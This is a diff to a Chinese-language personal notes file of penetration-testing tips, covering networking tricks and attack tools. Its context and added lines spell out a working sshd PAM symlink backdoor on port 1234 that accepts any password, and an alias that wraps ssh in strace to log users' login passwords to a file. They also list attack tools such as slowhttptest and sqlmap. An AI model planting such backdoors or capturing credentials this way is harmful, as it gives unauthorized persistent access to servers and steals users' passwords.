@@ -178,6 +178,8 @@ iptables -t mangle -A POSTROUTING -j TTL --ttl-inc 3
 
 ## http
 
+chrome浏览器的copy as curl command非常有用
+
 http慢链接攻击
 
 http方法
@@ -219,6 +221,10 @@ sshd pam.d 软链接后门
 
 ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=1234
 
+在客户端ssh user@ip -p 1234 输入任意密码即可登录
+
+
+
 通过strace + alias获取ssh登陆密码
 
 alias ssh="strace –o /tmp/ssh.trace.log ssh"
@@ -239,12 +245,13 @@ vnc 客户端和服务端握手流程
 
 我所关心关键词：发包速度，发包个数，发包类型
 
+curl
+
 slowhttptest
 
 wrk
 
 sqlmap
-
 
 nmap
 
